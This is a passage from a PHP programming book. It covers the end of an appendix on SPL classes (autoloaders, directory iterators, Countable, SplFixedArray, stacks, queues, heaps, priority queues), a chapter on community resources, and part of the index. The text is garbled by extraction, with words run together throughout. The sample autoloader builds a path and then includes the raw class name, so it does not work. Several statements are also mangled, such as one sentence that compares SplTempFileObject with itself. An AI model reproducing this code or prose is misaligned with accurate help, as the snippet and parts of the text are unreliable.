SPL allows youtoregister multiple __autoload() functions thatwill becalled in
theorder they’re registered tofind classes when called:
appendix_02/autoload.php
/**
 * PEAR/Zend Framework compatible
 * autoloader.
 * 
 * This autoloader simply converts underscores
 * to sub-directories.
 * 
 * @param string $classname The class to be included
 * @return bool
 */
function MyAutoloader($classname)
{
  // Replace _ with OS appropriate slash and append .php
  $path = str_replace('_', DIRECTORY_SEPARATOR, $classname) . ➥
    '.php';PHP Master: W rite Cutting-edge Code 344
www.it-ebooks.info
  
  // Include the file, use @ to hide errors since
  // that is a valid result — it will go to the next
  // loader in the stack.
  $result = @include($classname);
  
  // Return boolean result
  return $result;
}
// If we already have an __autoload, register it, SPL will
// override it otherwise.
if (function_exists('__autoload')) {
  spl_autoload_register('__autoload');
}
// Register our autoloader
spl_autoload_register('MyAutoloader');
$obj = new Some_Class_Name(); // Includes Some/Class/Name.php
One gotcha isthatwhen youregister anSPL autoloader ,itwill effectively replace
anytraditional __autoload() function already created; youwill notice thatit’sre-
registered viaSPL ifoneexists.
Justlikeallcallbacks inPHP,youmay pass inanarray containing aclass and
method name tousestatic class methods, anobject instance, andamethod touse
anobject method. WithPHP 5.3,youmay also useaclosure.
Working with Dir ectories and Files
Prior toSPL, working with directories—for simple things like, say,listing files inside
adirectory—meant using theopendir() ,readdir() ,closedir() ,andrewinddir()
family offunctions. And then, ifyouwanted toknow more about afile,youwould
callfilemtime() ,filectime() ,fileowner() ,andsoon.Inshort, itkinda sucked.
Now thatwe’ve leftthestone ageofPHP 4,wehave thefollowing SPL classes
DirectoryIterator ,RecursiveDirectoryIterator ,FileSystemIterator ,and
SplFileInfo ,coupled withRecursiveIteratorIterator todothehard work for
us.345 Appendix B: SPL: The Standar d PHP Libr ary
www.it-ebooks.info
TheSPL class flowchart fordealing with directories isillustrated inFigure B.1.It
allstarts withSplFileInfo ,which isthen extended byDirectoryIterator ,then
FileSystemIterator ,andfinallyRecursiveDirectoryIterator .
Figur e B.1. SPL ’s classes and interfaces
Thefollowing code willrecursively iterate over allthefiles inadirectory anddisplay
relevant information:
appendix_02/File-Director y.php
$path = "/some/path/";
$directoryIterator = new RecursiveDirectoryIterator($path);
$recursiveIterator = new RecursiveIteratorIterator ➥
  ($directoryIterator, RecursiveIteratorIterator::SELF_FIRST);
foreach ($recursiveIterator as $file) {
  /* @var $file SplFileInfo */
  echo str_repeat("\t", $recursiveIterator->getDepth());
  if ($file->isDir()) {PHP Master: W rite Cutting-edge Code 346
www.it-ebooks.info
    echo DIRECTORY_SEPARATOR;
  }
  echo $file->getBasename();
  if ($file->isFile()) {
    echo " (" .$file->getSize(). " bytes)";
  } elseif ($file->isLink()) {
    echo " (symlink)";
  }
  echo PHP_EOL;
}
This will give output similar tothis:
.DS_Store (6148 bytes)
.localized (0 bytes)
/images
     .DS_Store (6148 bytes)
     gradient.jpg (16624 bytes)
index.html (2642 bytes)
/zendframework (symlink)
Inaddition totheiterators andSplFileInfo ,there’ salsoSplFileObject and
SplTempFileObject forworking with I/O.Functionally ,these twoclasses are
identical.
WhileSplTempFileObject takes apath,SplTempFileObject takes amemory limit
asitsconstructor argument. SplTempFileObject will store thefilecontents in
memory until ithitsthememory limit, atwhich point itwill automatically shift
thecontents todisk. Itwill take care ofcreating andremoving thetemporary file
correctly:
appendix_02/SPLFileInfo.php
// Open an uploaded file
$file = new SplFileObject($_FILES["file"]["tmp_name"]);
// Read it as a CSV
while ($row = $file->fgetcsv()) {
  // Handle the CSV data array
}347 Appendix B: SPL: The Standar d PHP Libr ary
www.it-ebooks.info
Countable
Another handy interface provided bySPListheCountable interface. This interface
does exactly what itsays onthetin:thatis,itmakes itpossible tocount thedata
comprising anobject.
Bydefault, anynon-array-type data passed tothemethods sizeof() orcount()
will return1.This goes forstrings, Booleans, objects, integers, floats …every data
type youcanthink of:
appendix_02/Countable.php  (excerpt)
class InaccurateCount {
  public $data = array();
  public function __construct()
  {
    $this->data = array('foo', 'bar', 'baz');
  }
}
$i = new InaccurateCount();
echo sizeof($i); // 1
?>
This isn’t exactly what weintended when wecalledsizeof() ;however ,wecan
alter thisbehavior with theCountable interface.
TheCountable interface hasonemethod toimplement, which, notsurprisingly ,is
calledcount() .Bycalling thismethod, wecanreturn what thecorrect count should
bebased onwhatever metrics welike:
appendix_02/Countable.php  (excerpt)
class AccurateCount implements Countable {
  public $data = array();
  public function __construct()
  {
    $this->data = array('foo', 'bar', 'baz');
  }PHP Master: W rite Cutting-edge Code 348
www.it-ebooks.info
  public function count() {
    return sizeof($this->data);
  }
}
$a = new AccurateCount();
echo sizeof($a); // 3
Forexample, youcould implement thisinyour database layer toreturn thenumber
ofrows affected orreturned byaquery ,with asimplesizeof($result) .
Data Structur es
WithPHP 5.3,anumber ofdata structures were introduced; themajority assist in
implementing standard computer science algorithms.
Fixed-size Arr ays
Thesimplest ofthese data structures isSplFixedArray .These function almost
identically toregular arrays, except thesizeisset(and limited). Thesolereason for
thisisperformance. Youmay change thesize, butdoing sowill effectively destroy
anyperformance gains youwould have otherwise had.
Themain restriction isthatallkeys must benumeric; additionally ,most ofthe
speed gains areonly realized when thedata isaccessed sequentially—especially
when writing data.
Simple benchmarks show thatSplFixedArray canboost performance statistics by
approximately 20times (one element) to4.3times (10million elements).
Table B.1shows these results.349 Appendix B: SPL: The Standar d PHP Libr ary
www.it-ebooks.info
Table B .1. Using SplFixedArray  has noticeable advantages
Speed Incr ease Number of Elements
20x 1
11x 10
7x 100
6.7x 1000
6.4x 10,000
4.9x 100,000
4.5x 1000,000
4.3x 10,000,000
Agreat useforthismight bewhen fetching database results. Given thatwealready
know thenumber ofresults, wecanuseanSplFixedArray tocreate ourreturn array ,
andinatypical paging scenario of10-100 results perpage, wearegaining a700-
1100% speed increase!
Lists
Ifyoudon’t have afixed setsize, arefinewith using solely numeric indices, and
only need sequential access, youcanalsogain some performance increase byusing
SplDoublyLinkedList .
Stacks and Queues
Stacks andqueues arevery similar—effectively ,they arearrays limited toLast In,
First Out(LIFO) orFirst In,First Out(FIFO), respectively .Theonly way toadddata
istotheendofthelist,andthen either popitofftheend(LIFO), orthebeginning
(FIFO).
TheSplStack (LIFO) andSplQueue (FIFO) classes implement these mechanisms.
Both ofthese classes have great useinthings likeparsers; forexample, youmight
want tobuild upaFIFO stack ofelements found while parsing XML, sothatyou
canreconstitute thedocument afterwards byjustiterating over thestack:PHP Master: W rite Cutting-edge Code 350
www.it-ebooks.info
appendix_02/stack_queue.php  (excerpt)
$stack = new SplStack();
$stack->push(1);
$stack->push(2);
$stack->push(3);
foreach ($stack as $value) {
  echo $value . PHP_EOL;
}
This example, usingSplStack ,outputs 3,2,1(reverse order), while thenext, using
SplQueue ,does itintheexpected forward order ,outputting 1,2,3:
appendix_02/stack_queue.php  (excerpt)
$queue = new SplQueue();
$queue->push(1);
$queue->push(2);
$queue->push(3);
foreach ($queue as $value) {
  echo $value . PHP_EOL;
}
Heaps
Heaps aredata setsordered byrelevance between alltheother elements intheset.
Therelevancy canbedetermined byanyfactor ,asSplHeap isanabstract class you
must extend andimplement thecompare() method with. This method willcompare
twogiven values bywhatever criteria youdecide upon, andreturn-1toindicate
inequality infavor ofthefirst element, +1toindicate inequality infavor ofthe
second element, and0ifthey areequal.
SPL provides twodefault concrete implementations ofSplHeap :SplMinHeap and
SplMaxHeap .SplMinHelp will keep thesmallest value atthetopoftheheap, while
SplMaxHeap will keep thelargest atthetop.
Priority Queues
SplPriorityQueue isacombination heap andqueue—it isaqueue that, rather than
being FIFO, isordered byanitem’ spriority ,using theheap algorithm:351 Appendix B: SPL: The Standar d PHP Libr ary
www.it-ebooks.info
appendix_02/PriorityQueue.php
$queue = new SplPriorityQueue();
$queue->insert('foo', 1);
$queue->insert('bar', 3);
$queue->insert('baz', 0);
foreach ($queue as $value) {
  echo $value . PHP_EOL;
}
This will outputbar,foo,baz.Thepriority isdetermined bythesecond argument
totheinsert() method.
Functions
Last butnotleast, SPL provides anumber ofhandy utility functions:
class_implements()
returns alltheinterfaces implemented byaclass orobject
class_parents()
returns allparent classes ofagiven class orobject
iterator_apply()
calls acallback forevery valid element inaniterator
iterator_count()
counts alltheelements inaniterator
iterator_to_array()
converts anyiterator toanarray (multidimensional ifappropriate)
spl_object_hash()
returns aunique hash IDforanobject; canbeused toidentify said objectPHP Master: W rite Cutting-edge Code 352
www.it-ebooks.info
Appendix C: Next Steps
This book hascovered awide cross section oftopics thatPHP programmers will
need andusebeyond thebeginner stage. Youprobably realize, however ,thatwe
haven’t tackled absolutely everything there istoknow intheworld ofPHP! Soat
thispoint, what’ snext?
Keep Reading
One ofthejoys ofopen source software, andPHP inparticular ,isthewealth ofre-
sources thatarefreely and/or easily available online. There aresubscription services,
such asthemagazine from PHP Architect,1which provides aregular mixofPHP-
related topics.
There arealso alotofgreat blogs andnews/tutorial sites around. Agood way to
find outwhich websites suityouistosubscribe tooneofthesites thatsyndicate
PHP content allinto oneplace. Have alook atwhat comes in,andyou’ll soon de-
velop afeelforwhich sites youwant toread regularly .Some good syndication sites
togetyoustarted include:
■Planet PHP— http://www .planet-php.net/
■PHPDeveloper— http://phpdeveloper .org/
These sites round upnews from allsorts ofsources.
Inaddition, there arenew books coming outallthetime, sokeep watch onthenew
releases inyour favorite bookstore, beitvirtual orphysical. There aresome great
texts thatarespecific toaparticular area oractivity ,sowhen youpick upanew
project, it’sworth taking thetime tocheck outwhat texts have recently been released
inthatarea. Domake sure thatyoucheck thepublication dates foranidea ofhow
quickly thatparticular area isprogressing; however ,keep inmind thatsome topics
stay tolerably thesame foranumber ofyears, while others canbequite volatile.
Askaround forrecommendations andremember thatsometimes thebestresources
arefreely available.
1http://www .phparch.com/
www.it-ebooks.info
Attending Events
Whether youthink you’re apeople person ornot,attending events always broadens
themind. There’ salack ofaformal career progression inPHP,which means that
developers have allkinds ofbackgrounds andexperiences, andevery event attracts
attendees from avariety oflevels. Some canbeabitexpensive andinvolve travel,
while others arequite theopposite, sokeep your eyes andears open forthose that
might prove agood fitforyou.
Events canbesplit into arange ofdifferent types:
Conferences
These canbecommercial, orrunbythecommunity ,buteither way they usually
include scheduled content, with speakers submitting talks intoacallforpapers.
Ataconference, youknow upfront what content will beavailable andwhat
youcanexpect tolearn when you’re there.
Unconferences
Ifyou’ve heard about BarCamp,2you’ll bemore than familiar with unconfer -
ences. Unconferences aremuch lessformal than conferences, although they are
sometimes runasanaccompaniment toamain conference. Thevenue anddate
isset,people attend, andtheschedule ispopulated with talks offered bypeople
inattendance, andvoted forbytheattendees. Youmay ormay notfind many
talks relevant toyour interests, butyouareguaranteed tolearn something new!
Virtual conferences
While virtual conferences lack alotofthebenefits ofrealconferences—such
aschatting with thespeakers atthesocial events andmeeting people inthe
flesh who share your interests—they have plenty ofbenefits ontheir side. For
instance, they eliminate theneed fortravel oraccommodation—oh, andnobody
canjudge youonyour appearance!
Whatever type ofevent you’re attending, there’ smore toitthan justthesessions
themselves. Check theevent website andfigure outwhere thevirtual crowds are
beforehand—is there aTwitter hashtag oranIRC(Internet Relay Chat) channel as-
sociated with theevent? Ifyou’re going toareal-life event andyoudon’t know
2http://barcamp.org/PHP Master: W rite Cutting-edge Code 354
www.it-ebooks.info
anyone, thiscanbeagood opportunity toidentify cool people tomeet upwith
when yougetthere.
Doattend thesocial events! Themajority ofthedeveloper conference socials areas
tame asyoumight expect from acollection ofgeeks, andeveryone isquite prepared
totalkabout technology over adrink. You’ll meet new people andlearn new things,
ifyouletyourself.
User Gr oups
Isthere aPHP user group near you? (Ifnot,start one, andthen keep reading!) The
user groups areacommunity-led collection ofpeople who usually meet onaregular
basis andinvite talks ontechnical topics. Whether ornotyouwant tospend time
socializing with agroup ofpeople youdon’t know ,ornot,keep aneyeonthelist
oftalks, andmake time toattend when thetopic isofinterest.
Theuser groups often areinvolved inother activities inaddition totheir monthly
meets. They may doweekend workshops, hack onopen source, orcontribute to
PHP itself. Some runtheir own conferences orunconferences, andwill circulate
information about theevents thattheir members areattending.
Most user groups have anonline presence, with amailing list,forums, oranIRC
channel. Whether youareattending every group meeting orjusttheoccasional one,
they’re ideal forkeeping upwith what’ sgoing on,andgauging what youmight want
tobecome involved with. User groups canboost your skills inanapproachable
way—you gettoknow different people andyou’ll also hear about people looking
torecruit intotheir teams. This isagreat waytofindnew colleagues, whether they’re
joining you, oryouarelooking forateam tojoinyourself.
Online Communities
Ifthere isn’t agroup thatyoucaneasily getto,oryouprefer tomeet people virtually ,
there isavast number ofonline communities outthere. Itisworth looking fora
locally based one, though, ifonly foragood combination oflanguage andtime zone.
While themajority ofPHP discussions areinEnglish, there arehuge German- and
Portuguese-speaking communities, plus smaller ones inevery language imaginable.
Anapproachable way tobecome involved with acommunity istojoinamailing
list;many communities runthese andthey’re agood way ofgetting help inan355 Appendix C: Next Steps
www.it-ebooks.info
asynchronous manner .Email isamedium we’re allfamiliar with, andwecaneasily
post code snippets andsooninmessages. Alotofcommunities willusesomething
likeGoogle Groups,3which allows youtoreceive themessages inyour inbox as
they happen, indaily digest form, oryoucansimply visit theonline group page to
seethemessages. Most mailing lists have their own rules foretiquette andwhat
counts as“ontopic,” sodocheck theguidelines when yousign up.
Asimilar alternative istohave aforum. Many sites offer this, anditcanbeanex-
cellent way toshare ideas andaskfortechnical support onavariety oftopics.
Probably themost popular technical support forums currently aretobefound on
Stack Overflow ,4which isagood place toaskforhelp ifyouneed it.Remember ,
though, thatyou’ll earn more recognition andmore help ifyoualso answer other
people’ squestions where youcan. Ifyoutake thetime tohelp others, others are
more likely totake thetime tohelp you—it’ scalled karma.
Forreal-time communications, tryIRC(Internet Relay Chat), aprotocol fortext-
based group instant messaging. Asatechnology ,ithasbeen around awhile, butit
hasstood thetestoftime andthere aremany active communities thatuseit,partic-
ularly intheopen source arena. Many groups have channels onfreenode,5forex-
ample, andwill happily accept support questions inthose channels.
Theadvantages ofcommunicating instantly aremany .Youcanreceive prompt re-
sponses, especially forstandard questions. Youcanalso engage in“water cooler”
chatter with thepeople youmeet online, andgettoknow abitabout them personally .
Inparticular ,you’ll learn who isaspecialist onwhich topics, soyou’ll know who
toaskorpoint people toforspecific areas ofexpertise.
Open Sour ce Projects
While itisgreat tobuild aproject ofyour own toimprove your skills, there isno
substitute forworking with others, because youlearn somuch byseeing andby
being seen. Anopen source project isahandy way togetinvolved indevelopment
outside ofwork, andcanbeideal forexercising your talents. Most open source
projects have anopen bugs list,andwill happily accept newcomers andhelp you
getsetup.
3http://groups.google.com/?pli=1
4http://stackoverflow .com/
5http://freenode.net/PHP Master: W rite Cutting-edge Code 356
www.it-ebooks.info
Working with aproject likethiscanprovide exposure tonew aspects oftheindustry
thataren’t available atwork, either because they’re notinuseinyour workplace,
orbecause they’re notassigned toyouthere. Developing anopen source project
means being able tomanage theentire development stack yourself, asdevelopment
environments aren’t normally provided—and thisalone canmean youlearn alot.
Youmight also find yourself coming into contact with new technologies such as
source control products, testsuites, orwebservices. This puts youinagood position
forlearning new skills thatyoucanlater build oninyour dayjob(either thisjobor
your next one!).357 Appendix C: Next Steps
www.it-ebooks.info
www.it-ebooks.info
Index
Symbols
$_(superglobal prefix), 90
$_COOKIE variable, 181
$_GET variable, 90, 181
$_instance property ,129
$_POST variable, 90, 181
$_REQUEST variable, 181
$_SER VER variable, 90, 91
$_SER VER['HTTP_HOST'] variable, 174
$_SER VER['PHP_SELF'] variable, 179
$_SER VER['REQUEST_URI'] variable,
160
$_SESSION variable, 181
.htaccess file
enabling XHProf, 229
/(delimiter), 161
302Found status code, 83
:(placeholder indicator), 48
::(scope resolution operator), 6
;(header value delimiter), 93
;(SQL delimiter), 59
==(comparison operator), 16
=== (comparison operator), 16
?(placeholder), 48
@(delimiter), 161
\(namespace operator), 9
_(directory indicator), 324
_(non-public indicator), 22
__(magic indicator), 3
__autoload() method, 5, 344–345
__call() method, 33–34, 272–273
__callStatic() method, 34
__clone() method, 17, 32__construct() method, 3, 32, 129
__destruct() method, 4, 32
__get() method, 22–23, 32
__getFunctions() method, 99
__invoke() method, 152
__set() method, 22–23, 32
__sleep(), 36–37
__toString method, 34–35
__wakeup(), 36–37
A
ab(ApacheBench), 204–206, 280–281
Accept header ,83, 92–93
accept() method, 144, 146
Accept-Charset header ,188
Accept-Encoding header ,188
Accept-Language header ,188
AcceptPathInfo configuration setting,
177
access modifiers (seevisibility )
ADD INDEX statement, 61
aggregate functions, 68–69
Ajax
about, 106
cross-domain requests, 111–114
onclick event, 109
aliasing, ofnamespaces, 10
allow_url_fopen, 87
ALTER TABLE statement, 61
ApacheBench (ab), 204–206, 280–281
APC caching, 218
APC extension, 212, 238–239
www.it-ebooks.info
APIs (Application Programming Inter -
faces)
(seealso specific APIs, e.g.HTTP ,
Ajax )
about, 73–74
design considerations, 125–126
(seealso design patterns )
documentation, 125
incorrect status codes in,90
JSON data format, 76–78
PHP internal, 327
security concerns, 105
service protocols, 95
test-driven development and, 254
testing considerations, 253–258
XML data format, 78–82
array_walk() method, 32
ArrayAccess, 343–344
ArrayObject, 343–344
arrays
array objects, 343–344
converting iterators to,352
creating data setswith, 266
fixed-size, 349–350
iterating over,32, 138–149
returned byerrorInfo(), 56
returned byfetch(), 46–47, 57
serializing, 35–37
setting placeholders with, 48–49
SimpleXMLElement vs,81
stacks/queues, 350–351
using JSON, 76–78
assert() function, 246
assert*() method, 275
assertEquals() method, 246
assertions
PHPUnit, 246, 269–270Selenium, 274–275
assertNot*() method, 275
asXML() method, 79
attack vectors
about, 173
brute force, 194
cross-site request forgery ,180
cross-site scripting, 176
packet sniffing, 198
passwords, 191
session fixation, 184
session hijacking, 186
session prediction, 184
SQL Injection, 189
user data, 174–176
authentication, ofusers, 183, 186
auto_append_file, 228, 278
auto_prepend_file, 228, 278
__autoload() method, 5, 344–345
autoloading
classes, 5
controllers, 119
exceptions, 29
stack-based, 344–345
AVG,68
B
backslash (\),9
Bazaar ,306
BDD (behavior -driven development),
254–258
beer,asreward, 314
beginT ransaction() method, 57
behavior -driven development (BDD),
254–258
benchmarking, 203–210, 280–281
binding, 49–51, 136360
www.it-ebooks.info
bindParam() method, 50–51
bindV alue() method, 50
branching, 303–306
branch-per -feature, 305
branch-per -version, 304
brute force attack, 194
buffering, output, 91, 119
build.xml file,314–315
C
Cache_Memcache class, 220
caching
about, 217–218
APC, 218
disk, 218
memcached, 218–226
opcode, 210–215
session data, 215–216
callstack, 231, 232
__call() method, 33–34, 272–273
callbacks, 32, 149–153, 352
callgraph, 232
__callStatic() method, 34
CAPTCHA codes, 197
$captureScreenshotOnFailure flag, 277
changeset, 307
channel servers, 320–324, 336–340
channel.xml file,338
channel-info command, 320
Charles Proxy ,100
checking out,300
class_implements(), 352
class_parents(), 352
classes
about, 2
autoloading, 5
constructors, 3–4, 136declaring, 2–3
dependent, 249–250
getting parent, 352
namespaces and, 8–10
naming, 289, 324
clone keyword, 17
__clone() method, 17, 32
cloning
objects, 17
repositories, 306, 308–309
closures, 32, 152
code analysis
about, 285–286
with phpcpd, 287–288
with phploc, 286–287
with phpmd, 288–289
code management (seesource control )
code optimization (seeprofiling ;XHProf )
code repository (seerepositories )
code smells, 288
code sniffing (seePHP Code Sniffer )
coding standards
about, 290
checking with PHP Code Sniffer ,290–
292
choosing, 293–294
installing PHP Code Sniffer ,290
viewing violations, 293
colon, double (::),6
colon, single (:),48
comments, asdocumentation, 294
comments, SQL (--),190
commit() method, 57
committing changes
about, 300
indistributed system, 307
inGit,309–310361
www.it-ebooks.info
resolving conflicts, 301–303
inSubversion, 301
communities, online, 355–356
compare() method, 351
comparison operators, 16
compiling, ofPHP requests, 211–212
conferences, 354–355
__construct() method, 3, 32, 129
constructors, 3–4, 136, 289
contains() method, 132
content negotiation, 92
Content-Length header ,84
Content-T ypeheader ,83, 93
$context parameter ,88
controllers, 158, 166–169, 259–263
$_COOKIE variable, 181
cookies, 181, 187
copy-on-write, 15
COUNT ,68, 69
count() method, 23, 348–349
Countable interface, 23–24, 348–349
CREA TEPROCEDURE statement, 59
CREA TETABLE command, 42–43
create_stream_context() method, 88
cross-domain requests, 106, 111–114
cross-site request forgery (CSRF), 180
cross-site scripting (XSS), 176
CRUD functionality ,114
CSRF (cross-site request forgery), 180
CSS expressions, 262
CSS selectors, 273–274
CSV,fordata sets, 266
ctype extension, 175
cURL, 84–86, 102–103
curl_exec() method, 86
curl_info() function, 86
curl_init() method, 86curl_setopt() method, 86
current() method, 140
cyclomatic complexity ,287
D
data normalization, 70–72
data sets
creating, 266–269
ordering, 351
Data Source Name (DSN), 45
data storage, 39–41, 119–120
data typing, 13–14, 30, 81–82
Database extension, 275
database tables
adding data, 43–44
creating, 42–43
deleting data, 53
inserting data, 52–53
querying, 46–49
database testing
about, 263–264
connecting with PHPUnit, 265–266
creating data sets, 266–269
writing testcases, 264–265, 269–270, 
275–277
databases
change management, 311–313
connecting using Registry::set(), 134–
136
connecting with DB::getInstance(), 129
connecting with PDO, 45
connecting with PHPUnit, 265–266
optimizing performance, 216–217
relational (seerelational databases )
seeding, 266–269
storing procedures, 59362
www.it-ebooks.info
testing (seedatabase testing )
types of,41
Date header ,84
date() function, 81
DBadapter ,232
$db_conn variable, 45
debugging
inspecting traffic, 100–101
logging errors, 100
inSelenium, 277–278
SOAP ,97
trace option, 97
Xdebug, 227, 249, 327
DELETE requests, 124
DELETE statement, 53
delimiters, PDO vsSQL, 59
dependencies, 85, 153–156, 249–253, 
260, 262, 263
dependency injection pattern, 153–156, 
253, 260
deployment, automated
about, 310–311
planning, 313–315
using Phing, 314–315
using symlink, 311
design patterns
about, 127–128
choosing, 128
dependency injection, 153–156, 253, 
260
factory ,137–138
iterator ,138–149
Model-V iew-Controller (seeModel-
View-Controller (MVC) design )
observer ,149–153
proxy ,142
registry ,131–136singleton, 128–130
traits, 130–131
__destruct() method, 4, 32
directory functions, 345–347
DirectoryIterator class, 345
disk caching, 218
distributed control, 306–310
documentation
generating from code, 294–296
generating with phpDocumentor ,296–
298
importance of,125
DOM extension, 78
domain-specific language (DSL), 254
DomNodeList, 138
do-while loops, 140
DSL (domain-specific language), 254
DSN (Data Source Name), 45
E
echo(), 34, 100
elePHPant, 102
encapsulation, 1
encryption, password, 191
equals, double (==), 16
equals, triple (===), 16
error codes, 6, 88–90
error handling
(seealso exceptions )
inAPIs, 125
default PHP,31
error logs, 100
error_log(), 100
errorInfo() method, 56
escaping characters, 49, 161, 174, 178–
179
event handling, 149–153363
www.it-ebooks.info
event triggers, 150
Exception object, 28
exceptions
about, 26, 28
autoloading, 29
callbacks, 32
catching bytype, 29–30
extending, 28–29
handling, 27
inPDO, 54–57
inPHPUnit, 252
setting default handling, 31
throwing, 28
exec() method, 58
execute() method, 48, 55–56, 191
Expires header ,219
EXPLAIN command, 60–61
explode() method, 121
extends keyword, 12
extensions
APC, 212, 238–239
compiling, 326–329
ctype, 175
Database, 275
DOM, 78
installing, 324–325
pecl_http (seePECL (PHP Extension
Community Library) )
Perl-Compatible Regular Expression
(PCRE), 176
Selenium (seeSelenium )
SimpleXML, 78–82Xdebug (seeXdebug )
XHProf (seeXHProf )
zend (seeXdebug )
F
factory pattern, 137–138
Fail2ban, 196
fetch() method, 46, 56–57
fetch_style argument, 46–47
fetchAll() method, 46
FIEO (Filter Input, Escape Output), 174–
176
FIFO (First In,First Out), 152, 350
filefunctions, 345–347
filenaming conventions, 3, 5, 244
file_get_contents() method, 87
FileSystemIterator class, 345
Filter Input, Escape Output (FIEO), 174–
176
filtering, 139, 146–147, 174–176
FilterIterator class, 139, 144–146
final keyword, 250, 253
finally clause, 27
First In,First Out(FIFO), 152, 350
FlatXML, 266
Flickr API, 101–103
fluent interfaces, 17
foreach loops, 138, 139–140, 142
foreign keys, 62–63
forgery ,ofrequests, 180
forking, 308
forums, 356
FROM command, 48
functional tests, 260–262
functions
anonymous, 32, 152
ascallbacks, 32364
www.it-ebooks.info
specifying parameter types, 13–15
SPL utility ,352
G
GET requests, 83–84, 93–94, 105, 182
$_GET variable, 90, 181
__get() method, 22–23, 32
get() method, 132
GETAction() method, 120
getChildren(), 143
getConnection() method, 265
getDataSet() method, 267
__getFunctions() method, 99
getInstance() method, 129, 136
getLastRequest() method, 97
getLastRequestHeaders() method, 97
getLastResponse() method, 97
getLastResponseHeaders() method, 97
getMessage() method, 55
getMock() method, 250
getter methods, 21, 153
Git,308–310
gitlog,310
gitpull, 309
gitpush, 310
gitremote, 309
gitstatus, 310
GitHub, 308
Google Groups, 356
GROUP BYcommand, 69
H
handle() method, 96
hardening (code), 75
hasChildren(), 143
hash ID,352hash_algos() function, 193
hash_hmac() function, 193
hashing, 192, 352
header() function, 90
headers
about, 83–84
Accept, 83, 92–93
Accept-Charset, 188
Accept-Encoding, 188
Accept-Language, 188
assecurity tool, 188–189
Content-Length, 84
Content-T ype, 83, 93
Date, 84
Expires, 219
getting, 86
getting/sending, 90–91
Host, 83
Last-Modified, 219
listof,91–93
Location, 83, 184
qvalues, 93
REST and, 116
Set-Cookie, 84
User-Agent, 83, 188
heaps, 351–352
hijacking, session, 186
HMAC value, 193
Host header ,83, 174
.htaccess file
enabling mod_rewrite, 116
HTML source dumping, 278
htmlentities() function, 179
HTTP requests
about, 82
choosing response format, 93
cURL, 84–86, 102–103365
www.it-ebooks.info
debugging, 100–101
forged, 180
GET,83, 93–94, 105, 182
headers, 83–84, 86, 90–93
pecl_http PHP extension, 86–87
PHP streams, 87–88, 118
POST ,94, 106, 121–122, 182
redirecting, 116–117
routing, 118–119
simulating, 194
status codes, 88–90
HTTP traffic, inspecting, 100–101
$httpT imeout property ,275
HyperT extTransfer Protocol requests
(seeHTTP requests )
I
idattribute, 273
implements keyword, 25
inheritance, 10–13, 136
(seealso polymorphism )
INNER JOIN statement, 65–66
inner joins, 65–66
INSERT statement, 43–44, 52–53
$_instance property ,129
instanceOf operator ,14, 25
instantiation
infactory pattern, 137
ofobjects, 2, 4–5
inregistry pattern, 131
insingleton pattern, 128–130
interfaces
about, 23
Countable, 23–24
declaring, 24–25
identifiying, 25–26
listing, 352__invoke() method, 152
IRC(Internet Relay Chat), 356
Iterator class, 139
iterator pattern, 138–149
iterator_apply(), 352
iterator_count(), 352
iterator_to_array(), 352
IteratorAggregate class, 139
iterators, 345–347, 352
J
JavaScript Object Notation (JSON), 76–
78, 219
JMeter ,204, 206–210
Jones, Paul, 280
JSON (JavaScript Object Notation), 76–
78, 219
json_decode() function, 76, 118
json_encode() function, 76
K
Keep ItSimple, Stupid, 125
:key placeholder ,160
key() method, 140
keys
foreign, 62–63
primary ,42, 60
KISS principle, 125
L
lambdas, 32
Last In,First Out(LIFO), 350
lastInsertId() method, 52
Last-Modified header ,219
latestatic binding, 136
lazy loading, 128, 136366
www.it-ebooks.info
LIFO (Last In,First Out), 350
LIMIT clause, 147
LimitIterator class, 139, 147–149
linebreak indicator (PHP_EOL), 139
linking tables, 64
lists, 350
load testing
about, 279–280
with ab,280–281
with Siege, 281–282
Location header ,83, 184
locators, Selenium, 273–274
logfiles, 100
login attempts, limiting, 197
loops, 138–149
M
magic methods, 3, 32–33
(seealso allmethods beginning with
__)
magic quotes, 174
many-to-many relationships, 63–65
matchers, 252
MD5 algorithm, 192
md5() function, 193
memcached, 215–216, 217, 218–226
Mercurial, 306
meta-packages, 341
methods
about, 2
chaining together ,17
declaring, 3
magic, 32–33
magic (__), 3
non-existent, 33
redeclaring, 13
specifying parameter types, 13–15static, 6–7, 136
testdouble, 251
visibility (seevisibility )
mocking, 252
mod_rewrite, 159–160
models, 169–170
Model-V iew-Controller (MVC) design
(seeMVC (Model-V iew-Controller)
design )
MultipleIterator class, 139
MVC (Model-V iew-Controller) design
about, 5, 75, 156–157, 158
controller component, 158, 166–169
model component, 169–170
REST and, 118
testing, 259–263
view component, 171
MySQL
ADD INDEX, 61
ALTER TABLE, 61
AVG,68
connecting with PDO, 45
COUNT ,68, 69
CREA TEPROCEDURE, 59
CREA TETABLE, 42–43
DELETE, 53
delimiters, 59
error codes, 56
EXPLAIN, 60–61
FROM, 48
GROUP BY,69
INNER JOIN, 65–66
INSERT ,43–44, 52–53
LIMIT ,147
MAX/MIN, 68
optimizing queries, 217
ORDER BY,46367
www.it-ebooks.info
query binding, 49–51
RIGHT andLEFT JOIN, 67–68
SELECT ,46, 61
SUM, 68
UPDA TE,53
WHERE, 48
MySQL XML, 266, 267–269
mysql_escape_string() method, 49
N
name attribute, 273
namespace operator ,9
namespaces, 7, 8–10
naming conventions
classes, 289, 324
constructors, 289
PEAR, 244, 247, 324
variables, 289
new keyword, 4
new operator ,137
next() method, 140, 144
normalization, 70–72
NoSQL, 41, 216
O
ob_flush() function, 91
ob_start() method, 91
object operator (->), 6
object-oriented programming (OOP), 1–
2
objects
about, 2
accessing properties, 5–6
calling methods, 5–6
cloning, 17
comparing, 16fluent interfaces, 17
asfunction parameters, 16–17
inheritance, 10–13
inspecting, 4
instantiating, 2, 4–5, 128–130, 131, 
137
namespaces and, 8–10
polymorphism, 14–15
printing, 34–35
asreferences, 15–16
serializing, 35–37
type hinting, 13–14, 30
observer pattern, 149–153
one-to-many relationship, 42, 60, 62
online communities, 355–356
opcode caching, 210–215
open source projects, 356–357
ORDER BYstatement, 46
outer joins, 67–68
OuterIterator class, 142, 147–149
output
buffering, 91, 119
formatting, 105
P
packages
creating, 329–334
installing, 317–320
serving over channel, 338–340
versioning, 334–336
packet sniffing, 198
page source, dumping, 278
parameters, typing, 13–15
partitions, 219
passwords, encrypting, 191
PCRE (Perl-Compatible Regular Expres-
sion) extension, 176368
www.it-ebooks.info
PDO (PHP Data Object)
about, 39, 44–45
binding tostatements, 49–51
connecting toMySQL, 45
counting affected rows, 52–53, 58
deleting data, 53
escaping values, 49
handling exceptions, 54–57
inserting data, 52
